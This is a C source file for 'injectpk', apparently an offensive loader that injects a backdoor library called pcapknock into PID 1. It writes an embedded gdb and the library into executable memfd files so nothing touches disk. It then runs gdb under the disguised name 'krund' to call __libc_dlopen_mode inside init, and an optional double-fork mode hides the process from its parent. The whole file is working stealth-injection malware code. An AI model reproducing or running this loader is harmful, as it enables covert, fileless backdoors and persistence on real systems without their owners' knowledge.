/*
 * injectpk.c
 * Loader to inject pcapknock
 * By J. Stuart McMurray
 * Created 20190209
 * Last Modified 20190209
 */

#define _GNU_SOURCE
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>

#include "gdb.h"
#include "pcapknock.so.h"

/* PID into which to shove the library */
#define TARGETPID 1

/* Buffer length */
#define BUFLEN 4096

/* memfd_create syscall number */
#define MEMFD_CREATE_NR 319

void write_to_memfd(char **path, const void *buf, size_t count);

int
main(int argc, char **argv)
{
        ssize_t sz;
        char *procpath, *gdbname, *libname, *command;
        char binpath[BUFLEN];
        int pipefd[2];
        int gdbpid;

#ifdef DOUBLEFORK
        /* Double-fork from the get-go, if we're being sneaky */
        pid_t pid;
        int i, fd;

        /* Close all output if we're making a dissociated child */
        for (i = 0; i <= 1024; ++i)
                close(i);
        if (-1 != (fd = open("/dev/null", O_RDWR))) {
                dup2(STDIN_FILENO, fd);
                dup2(STDOUT_FILENO, fd);
                dup2(STDERR_FILENO, fd);
                if (fd != STDIN_FILENO && fd != STDOUT_FILENO &&
                                fd != STDERR_FILENO)
                        close(fd);
        }

        /* First of two forks */
        switch (pid = fork()) {
                case 0: /* Child */
                        break;
                case -1: /* Error */
                        return 1;
                default: /* Parent */
                        /* Wait on the child and we're done */
                        waitpid(pid, NULL, 0);
                        /* Go back to processing packets */
                        return 0;
        }

        /* In middle child */

        /* Disassociate from parent, and ignore child death */
        if (-1 == setsid())
                return 6;
        if (SIG_ERR == signal(SIGCHLD, SIG_IGN))
                return 7;

        /* Fork the real process */
        switch (pid = fork()) {
                case 0: /* Child */
                        break;
                case -1: /* Error */
                        return 8; /* Shouldn't work */
                default: /* Parent */
                        /* Die, let the child do the work */
                        return 0;
        }

#endif /* #ifdef DOUBLEFORK */

        /* Write gdb and the library to files */
        write_to_memfd(&gdbname, gdb, gdb_len);
        write_to_memfd(&libname, pcapknock_so, pcapknock_so_len);

        /* Get the path to the victim binary */
        if (-1 == asprintf(&procpath, "/proc/%i/exe", TARGETPID))
                err(4, "asprintf");
        bzero(binpath, sizeof(binpath));
        switch (sz = readlink(procpath, binpath, sizeof(binpath)-1)) {
                case -1:
                        err(5, "readlink");
                        break;
                case sizeof(binpath)-1:
                        errx(6, "path too long");
                        break;
        }
        free(procpath);

        /* Roll GDB command */
        if (-1 == asprintf(&command,
                                "print (void *)__libc_dlopen_mode(\"%s\", 2)\n",
                                libname))
                err(9, "asprintf");

        /* Pipe to send the command to gdb */
        if (-1 == pipe(pipefd))
                err(7, "pipe");

        /* Fire up GDB */
        switch (gdbpid = fork()) {
                case 0: /* Child */
                        close(pipefd[1]);
                        /* Read from the pipe */
                        if (-1 == dup2(pipefd[0], STDIN_FILENO))
                                err(13, "dup2");
                        if (-1 == execl(gdbname, "krund", "-se", binpath, "-pid=1", (char *)NULL))
                                err(14, "execl");
                case -1: /* Error */
                        err(8, "fork");
        }
        /* In parent */

        /* Send the command to the child */
        close(pipefd[0]);
        if (strlen(command) != write(pipefd[1], command, strlen(command)))
                err(10, "write");
        if (-1 == close(pipefd[1]))
                err(11, "close");

        /* Wait for GDB to finish */
        if (-1 == waitpid(gdbpid, NULL, 0))
                err(12, "waitpid");
}

/*
 * write_to_memfd shoves the n bytes at buf into a memfd and returns the name
 * in /proc/pid/fd of the new memfd.  There is no way to close it.  The caller
 * is responsible for freeing the memory which holds the path.
 */
void
write_to_memfd(char **path, const void *buf, size_t count)
{
        int fd; 

        /* Make the memfd */
        if (-1 == (fd = syscall(MEMFD_CREATE_NR, "", 0)))
                err(1, "memfd_create");
        /* Make sure it's executable */
        if (-1 == fchmod(fd, 0755))
                err(15, "fchmod");
        /* Populate it */
        if (count != write(fd, buf, count))
                err(2, "write");
        /* Get its name */
        if (-1 == asprintf(path, "/proc/%i/fd/%i", getpid(),fd))
                err(3, "asprintf");
}
